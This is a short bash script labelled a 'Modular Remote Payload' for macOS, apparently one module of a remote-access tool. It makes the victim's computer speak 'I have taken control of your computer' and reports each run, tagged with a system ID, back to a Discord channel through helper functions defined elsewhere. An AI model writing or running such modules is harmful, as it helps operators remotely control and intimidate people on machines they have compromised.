#!/bin/bash
# ============================================================
# Text to Speech for macOS - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)

MESSAGE="${MSG:-Hello, I have taken control of your computer. This is a security test.}"

# macOS has built-in 'say' command
say "$MESSAGE"

send_discord "🔊 **TTS Executed on $SYSID** (macOS)\nMessage: \`$MESSAGE\`"

